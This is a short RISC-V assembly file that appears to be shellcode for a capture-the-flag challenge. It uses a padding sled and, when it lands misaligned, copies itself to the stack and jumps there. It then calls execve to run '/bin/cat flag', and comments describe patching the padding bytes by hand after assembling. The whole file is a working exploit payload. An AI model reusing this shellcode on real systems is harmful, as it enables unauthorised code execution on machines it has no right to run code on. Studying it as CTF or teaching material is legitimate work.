    .global _start
    .text
_start:
    .fill 469, 2, 0x1010
    j main                      # run normally when we're half-word aligned 
    .fill 1, 2, 0x1010          # add one "10" to this padding after assembling

    # copy good code to stack and execute when we're not half-word aligned
    lla s0, end               
    addi t0, s1, 52             # copying a little more than I need to, but it's fine
loop:                         
    lb s1, 1(s0)                # 1 offset bc we'll add one byte after assembling between lla and end
    sb s1, 0(sp)
    c.addi s0, -1               # decrement pointer to good code
    c.addi t0, -1               # decrement counter
    c.addi sp, -1               # decrement stack pointer
    bnez t0, loop
    jr sp                       # jump to stack

    .fill 1, 2, 0x1010          # remove one "10" from this padding after assembling

main:
    addi sp, sp, -24            # allocate stack

    jal s1, skip1               # put strings on stack
    .ascii "/bin/cat\0\0"
skip1:
    sd s1, 0(sp) 
    jal s1, skip2
    .ascii "flag\0\0"
skip2:
    sd s1, 8(sp)

    c.li s1, 0                  # terminate argv array
    sd s1, 16(sp)

    ld a0, 0(sp)                # a0 = filename
    mv a1, sp                   # a1 = argv
    c.li a2, 0                  # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
end:
